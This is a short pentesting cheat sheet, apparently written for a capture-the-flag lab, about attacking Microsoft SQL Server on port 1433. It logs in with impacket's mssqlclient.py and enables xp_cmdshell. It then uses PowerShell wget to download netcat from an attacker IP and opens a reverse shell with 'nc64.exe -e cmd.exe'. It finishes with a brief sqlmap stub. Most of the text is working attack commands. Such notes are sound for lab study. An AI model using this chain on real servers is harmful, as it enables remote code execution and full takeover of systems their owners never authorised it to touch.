1433 (Microsoft SQL Server)
------------------------------

* `impacket` -> `mssqlclient.py`

	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:

```
mssqlclient.py username@10.10.10.125
```

It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**

```
mssqlclient.py username@10.10.10.125 -windows-auth
```
```
sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
```

If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:

```
SQL> enable_xp_cmdshell
```

though, you may not have permission. If that DOES succeed, you can now run commands like:

```
SQL> xp_cmdshell whoami
```

check the role you have on the server
```
SELECT is_srvrolemember('sysadmin');
```
use for enabling command shell:

check PWD
```
xp_cmdshell "powershell -c pwd"
```

Download NC from local server
```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"
```
exploit
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.86 443"


# Exploiting SQL

## sqlmap
get a cookie using the burp or cookie editor extention
since you will need it for auth
